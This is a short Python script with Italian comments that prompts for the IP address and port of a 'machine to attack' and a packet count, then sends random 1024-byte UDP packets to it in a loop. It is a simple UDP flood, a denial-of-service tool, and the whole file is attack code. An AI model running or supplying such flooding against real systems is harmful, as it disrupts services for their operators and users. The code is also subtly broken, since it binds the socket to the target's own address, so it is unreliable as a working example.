import socket           #Importazione della libreria socket per poter avviare la comunicazione
import random           #Importazione della libreria random per randomizzare i dati

target = input ("\n\nInserisci l'indirizzo IP della macchina da attaccare: ")

port = int (input("\n\nInserisci la porta della macchina da attaccare: "))

n = int (input ("\n\nInserire quanti pacchetti UDP inviare: "))         #Inserimento del numero di pacchetti UDP da inviare
i=0             #Variabile per il controllo del ciclo while per l'invio dei pacchetti

while 1:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)            #Inizializzazione della varibile s utilizzando il metodo socket.socket per renderlo>
        s.bind((target, port))          #Collegamento del socket al target con la relativa porta
        data= random.randbytes(1024)    #Dato randomizzato in modo tale da mandare un dato da 1024 byte
        addr= (str(target), int (port)) #Inizializzazione della varibile addr con valore stringa del target ed un valore int per la porta
        while i<n:      #Ciclo utilizzato per l'invio di pacchetti UDP
                s.sendto(data,addr)     #Metodo utilizzato per inviare i dati all'indirizzo seguito dalla porta
                i=i+1
        s.close()       #Chiusura della connessione
        quit()
